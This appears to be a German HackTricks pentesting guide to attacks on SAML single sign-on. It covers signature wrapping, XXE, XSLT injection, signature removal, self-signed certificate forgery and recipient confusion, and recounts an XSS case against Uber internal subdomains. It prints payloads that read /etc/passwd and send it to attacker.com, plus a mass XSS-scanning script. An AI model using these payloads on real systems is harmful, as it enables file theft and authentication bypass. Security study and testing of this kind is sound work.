# SAML-Angriffe

## SAML-Angriffe

<details>

<summary>Lernen Sie AWS-Hacking von Grund auf mit <a href="https://training.hacktricks.xyz/courses/arte">htARTE (HackTricks AWS Red Team Expert)</a>!</summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

- Wenn Sie Ihr Unternehmen in HackTricks bewerben m√∂chten oder HackTricks als PDF herunterladen m√∂chten, √ºberpr√ºfen Sie die [ABONNEMENTPL√ÑNE](https://github.com/sponsors/carlospolop)!
- Holen Sie sich das offizielle PEASS & HackTricks-Merchandise
- Entdecken Sie die PEASS-Familie, unsere Sammlung exklusiver NFTs
- Treten Sie der Discord-Gruppe oder der Telegram-Gruppe bei oder folgen Sie uns auf Twitter
- Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die HackTricks- und HackTricks Cloud-GitHub-Repositories senden.

</details>

## Grundlegende Informationen

{% content-ref url="saml-basics.md" %}
[saml-basics.md](saml-basics.md)
{% endcontent-ref %}

## Tool

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor): Ein Tool, das eine URL oder eine Liste von URLs entgegennehmen und die SAML-Konsum-URL zur√ºckgeben kann.

## XML-Rundreise

Im XML wird der signierte Teil des XML im Speicher gespeichert, dann wird eine Codierung/Decodierung durchgef√ºhrt und die Signatur wird √ºberpr√ºft. Idealerweise sollte diese Codierung/Decodierung die Daten nicht ver√§ndern, aber in diesem Szenario k√∂nnten **die √ºberpr√ºften Daten und die Originaldaten nicht identisch sein**.

Beispielhaft sehen Sie den folgenden Code:
```ruby
require 'rexml/document'

doc = REXML::Document.new <<XML
<!DOCTYPE x [ <!NOTATION x SYSTEM 'x">]><!--'> ]>
<X>
<Y/><![CDATA[--><X><Z/><!--]]>-->
</X>
XML

puts "First child in original doc: " + doc.root.elements[1].name
doc = REXML::Document.new doc.to_s
puts "First child after round-trip: " + doc.root.elements[1].name
```
Die Ausf√ºhrung des Programms gegen REXML 3.2.4 oder fr√ºher w√ºrde stattdessen zu folgender Ausgabe f√ºhren:
```
First child in original doc: Y
First child after round-trip: Z
```
So sah REXML das urspr√ºngliche XML-Dokument aus dem obigen Programm:

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (561).png>)

Und so sah es es nach einer Runde Parsing und Serialisierung:

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (562).png>)

F√ºr weitere Informationen √ºber die Schwachstelle und wie man sie ausnutzen kann:

* [https://mattermost.com/blog/securing-xml-implementations-across-the-web/](https://mattermost.com/blog/securing-xml-implementations-across-the-web/)
* [https://joonas.fi/2021/08/saml-is-insecure-by-design/](https://joonas.fi/2021/08/saml-is-insecure-by-design/)

## XML Signature Wrapping-Angriffe

Bei **XML Signature Wrapping-Angriffen (XSW)** nutzen Angreifer eine Schwachstelle aus, die entsteht, wenn XML-Dokumente durch zwei verschiedene Phasen verarbeitet werden: **Signaturvalidierung** und **Funktionsaufruf**. Diese Angriffe beinhalten die Ver√§nderung der XML-Dokumentenstruktur. Konkret f√ºgt der Angreifer **gef√§lschte Elemente** ein, die die G√ºltigkeit der XML-Signatur nicht beeintr√§chtigen. Diese Manipulation zielt darauf ab, eine Diskrepanz zwischen den von der **Anwendungslogik** analysierten Elementen und denen, die vom **Signatur√ºberpr√ºfungsmodul** √ºberpr√ºft werden, zu erzeugen. Dadurch bleibt die XML-Signatur technisch g√ºltig und besteht die √úberpr√ºfung, aber die Anwendungslogik verarbeitet die **betr√ºgerischen Elemente**. Als Folge davon umgeht der Angreifer effektiv den **Integrit√§tsschutz** und die **Herkunftsauthentifizierung** der XML-Signatur und erm√∂glicht die **Injektion beliebigen Inhalts** ohne Erkennung.

Die folgenden Angriffe basieren auf **[diesem Blog-Beitrag](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/) und [diesem Paper](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf)**. √úberpr√ºfen Sie diese f√ºr weitere Details.


### XSW #1
- **Strategie**: Ein neues Wurzelelement mit der Signatur wird hinzugef√ºgt.
- **Auswirkung**: Der Validator kann zwischen dem legitimen "Response -> Assertion -> Subject" und dem vom Angreifer stammenden "b√∂sen neuen Response -> Assertion -> Subject" durcheinanderkommen, was zu Problemen mit der Datenintegrit√§t f√ºhrt.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-1.svg](<../../.gitbook/assets/image (538).png>)

### XSW #2
- **Unterschied zu XSW #1**: Verwendet eine abgel√∂ste Signatur anstelle einer umschlie√üenden Signatur.
- **Auswirkung**: Die "b√∂se" Struktur, √§hnlich wie bei XSW #1, zielt darauf ab, die Gesch√§ftslogik nach der Integrit√§tspr√ºfung zu t√§uschen.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-2.svg](<../../.gitbook/assets/image (539).png>)

### XSW #3
- **Strategie**: Eine b√∂se Assertion wird auf derselben hierarchischen Ebene wie die urspr√ºngliche Assertion erstellt.
- **Auswirkung**: Ziel ist es, die Gesch√§ftslogik zu verwirren und zur Verwendung der b√∂sartigen Daten zu verleiten.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-3.svg](<../../.gitbook/assets/image (540).png>)

### XSW #4
- **Unterschied zu XSW #3**: Die urspr√ºngliche Assertion wird zu einem Kind der duplizierten (b√∂sen) Assertion.
- **Auswirkung**: √Ñhnlich wie bei XSW #3, aber es wird die XML-Struktur aggressiver ver√§ndert.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-4.svg](<../../.gitbook/assets/image (541).png>)

### XSW #5
- **Besonderheit**: Weder die Signatur noch die urspr√ºngliche Assertion entsprechen den Standardkonfigurationen (umh√ºllend/umh√ºllend/abgel√∂st).
- **Auswirkung**: Die kopierte Assertion umh√ºllt die Signatur und ver√§ndert die erwartete Dokumentenstruktur.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-5.svg](<../../.gitbook/assets/image (542).png>)

### XSW #6
- **Strategie**: √Ñhnliche Positionseinf√ºgung wie bei XSW #4 und #5, aber mit einer Wendung.
- **Auswirkung**: Die kopierte Assertion umh√ºllt die Signatur, die dann die urspr√ºngliche Assertion umh√ºllt, wodurch eine verschachtelte irref√ºhrende Struktur entsteht.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-6.svg](<../../.gitbook/assets/image (543).png>)

### XSW #7
- **Strategie**: Ein Extensions-Element wird mit der kopierten Assertion als Kind eingef√ºgt.
- **Auswirkung**: Dieser Angriff nutzt das weniger restriktive Schema des Extensions-Elements aus, um Schema-Validierungsgegenma√ünahmen zu umgehen, insbesondere in Bibliotheken wie OpenSAML.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-7.svg](<../../.gitbook/assets/image (544).png>)

### XSW #8
- **Unterschied zu XSW #7**: Verwendet ein anderes weniger restriktives XML-Element f√ºr eine Variante des Angriffs.
- **Auswirkung**: Die urspr√ºngliche Assertion wird zu einem Kind des weniger restriktiven Elements, wodurch die in XSW #7 verwendete Struktur umgekehrt wird.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-8.svg](<../../.gitbook/assets/image (545).png>)

### Tool

Sie k√∂nnen die Burp-Erweiterung [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) verwenden, um die Anfrage zu analysieren, einen beliebigen XSW-Angriff auszuw√§hlen und ihn auszuf√ºhren.

## XXE

Wenn Sie nicht wissen, welche Arten von Angriffen XXE sind, lesen Sie bitte die folgende Seite:

{% content-ref url="../xxe-xee-xml-external-entity.md" %}
[xxe-xee-xml-external-entity.md](../xxe-xee-xml-external-entity.md)
{% endcontent-ref %}

SAML-Antworten sind **deflatierte und base64-kodierte XML-Dokumente** und k√∂nnen anf√§llig f√ºr XML External Entity (XXE)-Angriffe sein. Indem sie die XML-Struktur der SAML-Antwort manipulieren, k√∂nnen Angreifer versuchen, XXE-Schwachstellen auszunutzen. So kann ein solcher Angriff visualisiert werden:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY    file SYSTEM "file:///etc/passwd">
<!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
<samlp:Response ... ID="_df55c0bb940c687810b436395cf81760bb2e6a92f2" ...>
<saml:Issuer>...</saml:Issuer>
<ds:Signature ...>
<ds:SignedInfo>
<ds:CanonicalizationMethod .../>
<ds:SignatureMethod .../>
<ds:Reference URI="#_df55c0bb940c687810b436395cf81760bb2e6a92f2">...</ds:Reference>
</ds:SignedInfo>
<ds:SignatureValue>...</ds:SignatureValue>
[...]
```
## Werkzeuge

Sie k√∂nnen auch die Burp-Erweiterung [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) verwenden, um den POC aus einer SAML-Anfrage zu generieren und auf m√∂gliche XXE-Schwachstellen und SAML-Schwachstellen zu testen.

Schauen Sie sich auch diesen Vortrag an: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XSLT √ºber SAML

F√ºr weitere Informationen zu XSLT gehen Sie zu:

{% content-ref url="../xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

Extensible Stylesheet Language Transformations (XSLT) k√∂nnen verwendet werden, um XML-Dokumente in verschiedene Formate wie HTML, JSON oder PDF zu transformieren. Es ist wichtig zu beachten, dass **XSLT-Transformationen vor der √úberpr√ºfung der digitalen Signatur durchgef√ºhrt werden**. Dies bedeutet, dass ein Angriff auch ohne g√ºltige Signatur erfolgreich sein kann; eine selbstsignierte oder ung√ºltige Signatur reicht aus, um fortzufahren.

Hier finden Sie einen **POC**, um nach dieser Art von Schwachstellen zu suchen. Auf der hacktricks-Seite, die am Anfang dieses Abschnitts erw√§hnt wurde, finden Sie Payloads.
```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
...
<ds:Transforms>
<ds:Transform>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="doc">
<xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
<xsl:variable name="escaped" select="encode-for-uri($file)"/>
<xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
<xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
<xsl:value-of select="unparsed-text($exploitUrl)"/>
</xsl:template>
</xsl:stylesheet>
</ds:Transform>
</ds:Transforms>
...
</ds:Signature>
```
### Tool

Sie k√∂nnen auch die Burp-Erweiterung [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) verwenden, um den POC aus einer SAML-Anfrage zu generieren und auf m√∂gliche XSLT-Schwachstellen zu testen.

Schauen Sie sich auch diesen Vortrag an: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XML-Signaturausschluss <a href="#xml-signature-exclusion" id="xml-signature-exclusion"></a>

Der **XML-Signaturausschluss** beobachtet das Verhalten von SAML-Implementierungen, wenn das Signatur-Element nicht vorhanden ist. Wenn dieses Element fehlt, kann **die Signaturvalidierung m√∂glicherweise nicht stattfinden**, was es anf√§llig macht. Dies kann getestet werden, indem die Inhalte, die normalerweise von der Signatur √ºberpr√ºft werden, ge√§ndert werden.

![https://epi052.gitlab.io/notes-to-self/img/saml/signature-exclusion.svg](<../../.gitbook/assets/image (547).png>)

### Tool <a href="#xml-signature-exclusion-how-to" id="xml-signature-exclusion-how-to"></a>

Sie k√∂nnen auch die Burp-Erweiterung [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) verwenden. Fangen Sie die SAML-Antwort ab und klicken Sie auf `Remove Signatures`. Dadurch werden **alle** Signatur-Elemente entfernt.

Nachdem die Signaturen entfernt wurden, lassen Sie die Anfrage zum Ziel weiterleiten. Wenn die Signatur vom Dienst nicht ben√∂tigt wird,

## Zertifikatsf√§lschung <a href="#certificate-faking" id="certificate-faking"></a>

Zertifikatsf√§lschung ist eine Technik, um zu testen, ob ein **Service Provider (SP) ordnungsgem√§√ü √ºberpr√ºft, ob eine SAML-Nachricht von einem vertrauensw√ºrdigen Identity Provider (IdP) signiert** ist. Dabei wird ein ***selbstsigniertes Zertifikat** verwendet, um die SAML-Antwort oder Assertion zu signieren, was bei der Bewertung des Vertrauensvalidierungsprozesses zwischen SP und IdP hilft.

### Durchf√ºhrung der Zertifikatsf√§lschung
Die folgenden Schritte beschreiben den Prozess unter Verwendung der Burp-Erweiterung [SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e):

1. Fangen Sie die SAML-Antwort ab.
2. Wenn die Antwort eine Signatur enth√§lt, senden Sie das Zertifikat an SAML Raider Certs mit der Schaltfl√§che `Send Certificate to SAML Raider Certs`.
3. W√§hlen Sie im Tab "SAML Raider Certificates" das importierte Zertifikat aus und klicken Sie auf `Save and Self-Sign`, um eine selbstsignierte Kopie des Originalzertifikats zu erstellen.
4. Gehen Sie zur√ºck zur abgefangenen Anfrage in Burps Proxy. W√§hlen Sie das neue selbstsignierte Zertifikat aus dem XML-Signatur-Dropdown aus.
5. Entfernen Sie vorhandene Signaturen mit der Schaltfl√§che `Remove Signatures`.
6. Signieren Sie die Nachricht oder Assertion mit dem neuen Zertifikat mithilfe der Schaltfl√§che **`(Re-)Sign Message`** oder **`(Re-)Sign Assertion`**, je nachdem, was zutrifft.
7. Leiten Sie die signierte Nachricht weiter. Eine erfolgreiche Authentifizierung zeigt an, dass der SP Nachrichten akzeptiert, die von Ihrem selbstsignierten Zertifikat signiert sind, und offenbart potenzielle Schwachstellen im Validierungsprozess der SAML-Nachrichten.


## Verwirrung des Token-Empf√§ngers / Verwirrung des Service Providers <a href="#token-recipient-confusion" id="token-recipient-confusion"></a>

Die Verwirrung des Token-Empf√§ngers und die Verwirrung des Service Providers beinhalten die √úberpr√ºfung, ob der **Service Provider den beabsichtigten Empf√§nger einer Antwort korrekt validiert**. Im Wesentlichen sollte ein Service Provider eine Authentifizierungsantwort ablehnen, wenn sie f√ºr einen anderen Anbieter bestimmt war. Das entscheidende Element hierbei ist das **Recipient**-Feld, das sich im **SubjectConfirmationData**-Element einer SAML-Antwort befindet. Dieses Feld gibt eine URL an, die angibt, wohin die Assertion gesendet werden muss. Wenn der tats√§chliche Empf√§nger nicht mit dem beabsichtigten Service Provider √ºbereinstimmt, sollte die Assertion als ung√ºltig betrachtet werden.

#### **Wie es funktioniert**

Damit ein SAML Token Recipient Confusion (SAML-TRC) Angriff durchf√ºhrbar ist, m√ºssen bestimmte Bedingungen erf√ºllt sein. Erstens muss es ein g√ºltiges Konto auf einem Service Provider (SP-Legit) geben. Zweitens muss der angegriffene Service Provider (SP-Target) Token vom selben Identity Provider akzeptieren, der SP-Legit bedient.

Unter diesen Bedingungen ist der Angriffsprozess einfach. Eine authentische Sitzung wird √ºber den gemeinsam genutzten Identity Provider mit SP-Legit initiiert. Die SAML-Antwort vom Identity Provider an SP-Legit wird abgefangen. Diese abgefangene SAML-Antwort, die urspr√ºnglich f√ºr SP-Legit bestimmt war, wird dann an SP-Target umgeleitet. Der Erfolg dieses Angriffs wird daran gemessen, dass SP-Target die Assertion akzeptiert und Zugriff auf Ressourcen unter demselben Kontonamen gew√§hrt, der f√ºr SP-Legit verwendet wurde.
```python
# Example to simulate interception and redirection of SAML Response
def intercept_and_redirect_saml_response(saml_response, sp_target_url):
"""
Simulate the interception of a SAML Response intended for SP-Legit and its redirection to SP-Target.

Args:
- saml_response: The SAML Response intercepted (in string format).
- sp_target_url: The URL of the SP-Target to which the SAML Response is redirected.

Returns:
- status: Success or failure message.
"""
# This is a simplified representation. In a real scenario, additional steps for handling the SAML Response would be required.
try:
# Code to send the SAML Response to SP-Target would go here
return "SAML Response successfully redirected to SP-Target."
except Exception as e:
return f"Failed to redirect SAML Response: {e}"
```
## XSS in Logout-Funktionalit√§t

Die Originalforschung kann √ºber [diesen Link](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/) abgerufen werden.

W√§hrend des Prozesses des Verzeichnis-Brute-Forcings wurde eine Logout-Seite entdeckt unter:
```
https://carbon-prototype.uberinternal.com:443/oidauth/logout
```
Beim Zugriff auf diesen Link erfolgte eine Weiterleitung zu:
```
https://carbon-prototype.uberinternal.com/oidauth/prompt?base=https%3A%2F%2Fcarbon-prototype.uberinternal.com%3A443%2Foidauth&return_to=%2F%3Fopenid_c%3D1542156766.5%2FSnNQg%3D%3D&splash_disabled=1
```
Dies enth√ºllte, dass der `base`-Parameter eine URL akzeptiert. In Anbetracht dessen entstand die Idee, die URL durch `javascript:alert(123);` zu ersetzen, um einen XSS (Cross-Site Scripting) Angriff zu initiieren.


### Massenausbeutung

[Aus dieser Forschung](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/):

Das Tool [**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor) wurde verwendet, um Subdomains von `uberinternal.com` auf Domains zu analysieren, die dieselbe Bibliothek nutzen. Anschlie√üend wurde ein Skript entwickelt, um die Seite `oidauth/prompt` anzugreifen. Dieses Skript testet auf XSS (Cross-Site Scripting), indem es Daten eingibt und √ºberpr√ºft, ob sie im Output reflektiert werden. In F√§llen, in denen die Eingabe tats√§chlich reflektiert wird, markiert das Skript die Seite als verwundbar.
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import init ,Fore, Back, Style
init()

with open("/home/fady/uberSAMLOIDAUTH") as urlList:
for url in urlList:
url2 = url.strip().split("oidauth")[0] + "oidauth/prompt?base=javascript%3Aalert(123)%3B%2F%2FFady&return_to=%2F%3Fopenid_c%3D1520758585.42StPDwQ%3D%3D&splash_disabled=1"
request = requests.get(url2, allow_redirects=True,verify=False)
doesit = Fore.RED + "no"
if ("Fady" in request.content):
doesit = Fore.GREEN + "yes"
print(Fore.WHITE + url2)
print(Fore.WHITE + "Len : " + str(len(request.content)) + "   Vulnerable : " + doesit)
```
## Referenzen
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)\
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)
* [https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) **bei oder folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) **und** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **GitHub-Repositories senden.**

</details>
